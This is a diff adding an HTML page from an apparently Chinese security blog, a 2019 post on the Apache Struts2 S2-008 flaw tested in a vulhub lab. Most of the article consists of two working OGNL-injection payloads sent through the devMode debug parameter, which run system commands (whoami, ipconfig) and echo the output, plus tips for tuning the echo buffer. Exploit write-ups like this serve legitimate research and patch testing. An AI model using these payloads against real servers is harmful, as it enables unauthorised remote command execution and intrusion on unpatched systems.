@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html S2-00">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC">
+<meta property="og:url" content="https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/index.html">
+<meta property="og:site_name" content="Zeo 安全实验室">
+<meta property="og:description" content="@TOC 1.环境环境https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;blob&#x2F;master&#x2F;README.zh-cn.md这个搭环境很方便快捷，具体可以看说明，很简单 2.原理参考 http:&#x2F;&#x2F;rickgray.me&#x2F;2016&#x2F;05&#x2F;06&#x2F;review-struts2-remote-command-execution-vulnerabilities.html S2-00">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701164539250.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170137420.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2019-07-01T09:08:11.000Z">
+<meta property="article:modified_time" content="2020-05-08T07:43:29.365Z">
+<meta property="article:author" content="Zeo">
+<meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="二进制">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/07/02/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-016%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-005%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8CPOC/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&text=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&is_video=false&description=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC&body=Check out this article: https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&name=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&t=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number">6.</span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number">7.</span> <span class="toc-text">POC注意</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Zeo 安全实验室</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-07-01T09:08:11.000Z" itemprop="datePublished">2019-07-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/st2%E6%BC%8F%E6%B4%9E%E7%8E%8B/">st2漏洞王</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <a id="more"></a>
+
+
+<p>@<a href="【研究】Struts2漏洞之S2-008漏洞环境和可用POC">TOC</a></p>
+<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p>
+<h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><pre><code>参考 http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html</code></pre><blockquote>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+</blockquote>
+<h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Struts 2.1.0 - Struts 2.3.1</p>
+<h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开<br><img src="https://img-blog.csdnimg.cn/2019070117062659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug=command&amp;expression=%<span class="number">23</span>context%<span class="number">5</span>b%<span class="number">22</span>xwork.MethodAccessor.denyMethodExecution%<span class="number">22</span>%<span class="number">5</span>d%<span class="number">3</span>dfalse%<span class="number">2</span>c%<span class="number">23f</span>%<span class="number">3</span>d%<span class="number">23</span>_memberAccess.getClass%<span class="number">28</span>%<span class="number">29</span>.getDeclaredField%<span class="number">28</span>%<span class="number">22</span>allowStaticMethodAccess%<span class="number">22</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.setAccessible%<span class="number">28</span><span class="keyword">true</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23f</span>.set%<span class="number">28</span>%<span class="number">23</span>_memberAccess%<span class="number">2</span>ctrue%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>a%<span class="number">3</span>d<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime</span>%<span class="number">28</span>%<span class="number">29</span>.exec%<span class="number">28</span>%<span class="number">22</span>whoami%<span class="number">22</span>%<span class="number">29</span>.getInputStream%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>b%<span class="number">3</span>dnew java.io.InputStreamReader%<span class="number">28</span>%<span class="number">23</span>a%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>c%<span class="number">3</span>dnew java.io.BufferedReader%<span class="number">28</span>%<span class="number">23</span>b%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>d%<span class="number">3</span>dnew <span class="keyword">char</span>%<span class="number">5</span>b50000%<span class="number">5</span>d%<span class="number">2</span>c%<span class="number">23</span>c.read%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor%<span class="number">3</span>d%<span class="number">23</span>context.get%<span class="number">28</span>%<span class="number">22</span>com.opensymphony.xwork2.dispatcher.HttpServletResponse%<span class="number">22</span>%<span class="number">29</span>.getWriter%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.println%<span class="number">28</span>%<span class="number">23</span>d%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.flush%<span class="number">28</span>%<span class="number">29</span>%<span class="number">2</span>c%<span class="number">23</span>genxor.close%<span class="number">28</span>%<span class="number">29</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>这个POC是get模式传所以我们直接URL里面拼接就行</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/20190701164539250.png" alt="在这里插入图片描述"><br>一样弹出回显<img src="https://img-blog.csdnimg.cn/20190701164717926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="下载"><br><img src="https://img-blog.csdnimg.cn/20190701165118704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不知道什么编码，没东西好想</p>
+<p>**</p>
+<h2 id="有效POC’’"><a href="#有效POC’’" class="headerlink" title="有效POC’’"></a>有效POC’’</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.128:8080/struts2-showcase-2.1.6/showcase.action?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context["xwork.MethodAccessor.denyMethodExecution"]=false,%23cmd="ipconfig",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[501],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))</span></span><br></pre></td></tr></table></figure>
+<p>这个是网上找的结合007构造的POC<br>可以直接回显<br><img src="https://img-blog.csdnimg.cn/20190701165826109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="POC注意"><a href="#POC注意" class="headerlink" title="POC注意"></a>POC注意</h2><p>这个poc也是得自己去调整，不是完全试用的<br>简单阅读和实验之后发现POC，发现res存在大小上限<br>测试发现，res更改的数值可以控制回显的字数多少</p>
+<p>我这个大于700之后就是null了<br><img src="https://img-blog.csdnimg.cn/20190701170137420.png" alt="在这里插入图片描述"><br>但是从小的开始10慢慢增加会显示的数量<br><img src="https://img-blog.csdnimg.cn/20190701170343467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170403572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190701170433423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>500的时候差不多都显示了，所以这个得自己千调整试试</p>
+<p>注意灵活控制res大小，注意不要将res大小超过命令执行结果</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories">分类</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-环境"><span class="toc-number">1.</span> <span class="toc-text">1.环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-原理"><span class="toc-number">2.</span> <span class="toc-text">2.原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-影响版本"><span class="toc-number">3.</span> <span class="toc-text">3.影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-利用过程"><span class="toc-number">4.</span> <span class="toc-text">4.利用过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有效POC’’"><span class="toc-number">6.</span> <span class="toc-text">有效POC’’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC注意"><span class="toc-number">7.</span> <span class="toc-text">POC注意</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&text=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&is_video=false&description=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC&body=Check out this article: https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://godzeo.github.io/2019/07/01/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91Struts2%E6%BC%8F%E6%B4%9E%E4%B9%8BS2-008%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%92%8C%E5%8F%AF%E7%94%A8%E5%9B%9E%E6%98%BEPOC/&title=【研究】Struts2漏洞之S2-008漏洞环境和可用回显POC" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
